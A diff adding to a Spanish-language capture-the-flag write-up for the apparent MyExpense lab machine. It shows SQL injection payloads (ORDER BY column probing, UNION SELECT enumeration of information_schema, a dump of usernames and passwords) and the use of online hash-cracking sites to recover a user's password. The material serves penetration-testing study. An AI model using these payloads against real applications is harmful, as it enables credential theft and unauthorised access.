@@ -73,3 +73,29 @@ La solicitud está aceptada pero tiene que ser aprobada por un financial aprover
 En Rennes, vemos lo que parece una consulta a una BBDD, y en la URL también parece indicarlo. probaremos una inyección SQL
 <img src="https://github.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/blob/main/writeups/myexpense/myexpense14.jpg?raw=true">
 
+lo primero es determinar el numero de columnas
+```
+ORDER BY 2
+```
+Después determinar las bases de datos, tablas, columnas
+```
+UNION SELECT schema_name,null FROM information_schema.schemata-- -
+UNION SELECT table_name,null FROM information_schema.tables WHERE table_schema="myexpense"-- -
+UNION SELECT column_name,null FROM information_schema.columns WHERE table_schema="myexpense" and table_name="user"-- -
+UNION SELECT username, password from user-- -
+
+```
+<img src="https://github.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/blob/main/writeups/myexpense/myexpense15.jpg?raw=true">
+<img src="https://github.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/blob/main/writeups/myexpense/myexpense16.jpg?raw=true">
+
+## Decrypt password
+necesitamos desenccriptar la password de Paul Baudouin. nos dirigimos a cualquiera de estas webs:  
+<a href="https://crackstation.net/">Crackstation</a>
+<a href="https://hashes.com/en/decrypt/hash">Hashes</a>  
+
+<img src="https://github.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/blob/main/writeups/myexpense/myexpense17.jpg?raw=true">
+
+## Final
+Ya solo queda aprobar la derrama desde el usuario financial aprover.
+<img src="https://github.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/blob/main/writeups/myexpense/myexpense18.jpg?raw=true">
+
